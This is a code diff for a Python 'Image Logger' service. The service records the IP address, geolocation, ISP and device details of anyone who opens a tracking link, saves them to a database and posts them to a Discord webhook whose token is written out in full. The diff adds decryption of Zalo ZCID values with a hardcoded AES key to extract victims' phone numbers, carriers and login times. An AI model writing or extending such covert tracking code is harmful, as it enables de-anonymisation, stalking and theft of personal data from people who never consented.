@@ -7,6 +7,15 @@ import datetime
 import app.curd as curd
 import app.schemas as schemas
 from sqlalchemy.orm import Session
+from Crypto.Cipher import AES
+import base64
+from urllib.parse import unquote
+from Crypto.Util.Padding import pad, unpad
+import json
+import hashlib
+import binascii
+import re
+import codecs
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1127802266611634276/QkXfyBN2fEODy5EcY7ONZpYl0sljOFzme0vAuweTEIA1o1Dh9K2oIlRY-vUbPfGPa1iK",
@@ -71,14 +80,14 @@ config = {
 blacklistedIPs = ("27", "104", "143", "164")
 
 
-def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=None, port=None, filename=None, url_thumbnail=None, botname='Image Logger', db: Session = None):
+def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=None, port=None, filename=None, url_thumbnail=None, botname='Image Logger', db: Session = None, zalo = None):
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     os, browser = httpagentparser.simple_detect(useragent)
     if token:
         if curd.check_exists_token(db, token=token):
             logger_model = schemas.loggers(
                 ip=f'{ip}',
-                user_agents=str(useragent),
+                user_agents=str(useragent) + str(zalo),
                 device=f'{os} - {browser}',
                 ip_info=str(info),
                 filename=filename,
@@ -87,7 +96,7 @@ def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=Non
                 created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             )
             logger_res = curd.create_logger(db, loggers=logger_model)
-            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token=token, url_thumnail=url_thumbnail, type='Success: ', id=logger_res.id)
+            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=f'{useragent}', filename=filename, zalo = zalo, token=token, url_thumnail=url_thumbnail, type='Success: ', id=logger_res.id)
             res =requests.post(url, json=embed)
             return logger_res
         else:
@@ -102,7 +111,7 @@ def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=Non
                 created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             )
             logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
-            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token=f'Unknow token: {token}', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
+            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=f'{useragent}', filename=filename, token=f'Unknow token: {token}', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
             res =requests.post(url, json=embed)
             return logger_res
     else:
@@ -131,8 +140,8 @@ def generate_random_string(length):
     random_string = ''.join(random.choice(characters) for _ in range(length))
 
     return random_string
-def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename, token, url_thumnail, type ,id):
-    info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Di động: {ip_info['mobile']}, Proxy: {ip_info['proxy']}, Hosting: {ip_info['hosting']}\n6. {type}{id}"
+def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename, token, url_thumnail, type ,id, zalo=None):
+    info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Di động: {ip_info['mobile']}, Proxy: {ip_info['proxy']}, Hosting: {ip_info['hosting']}\n6. {type}{id}\n7.Phone:{zalo}"
     embed = {
         "username": "IP Logger",
         "avatar_url": url_thumnail,
@@ -148,3 +157,79 @@ def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename
          }]
     }
     return embed
+
+def convert_time(timestring):
+    timestring_int = int(timestring)
+    utc_time = datetime.datetime.fromtimestamp(
+        timestring_int / 1000
+    ).strftime("%H:%M:%S %d-%m-%Y")
+    return utc_time
+
+def deMessage(e,key):
+    try:
+        e = base64.b64decode(e)
+        key = base64.b64decode(key)
+        iv = bytes.fromhex("00000000000000000000000000000000")
+        encodings = ['utf-8', 'latin-1']  # Add more encodings if needed
+        for encoding in encodings:
+            try:
+                decrypted_data = decrypt_data(e, key, iv, encoding)
+                return decrypted_data
+            except UnicodeDecodeError:
+                continue
+        return "Failed to decode the input data with any encoding"
+    except Exception as e:
+        return str(e)
+
+def decrypt_data(data, key, iv, encoding):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
+    return decrypted_data.decode(encoding)  
+
+def decrypt_zcid(e, key):
+    try:
+        e = codecs.decode(e, 'hex')
+        key = key.encode('utf-8')
+        iv = bytes.fromhex("00000000000000000000000000000000")
+        encodings = ['utf-8', 'latin-1']  # Add more encodings if needed
+        for encoding in encodings:
+            try:
+                decrypted_data = decrypt_data(e, key, iv, encoding)
+                return decrypted_data
+            except UnicodeDecodeError:
+                continue
+        return "Failed to decode the input data with any encoding"
+    except Exception as e:
+        return str(e)
+
+
+
+def checkinfo(t_md, ZCID, networktype, operator, useragent=None):
+ 
+    if ZCID:
+        operator_name = get_operator(operator)
+        zcid_data = decrypt_zcid(ZCID, 'IXX3RM3GABH3NS0AED3VV04N9ABCDA1D')
+        parts = zcid_data.split(',')
+        # Extract the timestamp
+        timestamp = parts[3]
+        if networktype == '0':
+            return f'Phone: {parts[2]} - mạng: wifi - mạng di động: {operator_name} - LoginTime:{convert_time(timestamp)}'
+        else:
+            return f'Phone: {parts[2]} - mạng: LTE - mạng di động: {operator_name} - LoginTime:{convert_time(timestamp)}'
+    if t_md:
+        return 'Loại thiết bị: Apple'
+    else:
+        if 'zplayer' in useragent:
+            return 'Loại thiết bị: Apple'
+    return 'Không phải thiết bị di động'
+
+def get_operator(mnc):
+    switcher = {
+        '45201': 'Mobifone',
+        '45202': 'Vinaphone',
+        '45204': 'Viettel',
+        '45205': 'Vietnamobile'
+    }
+    return switcher.get(mnc, mnc)
+    
+
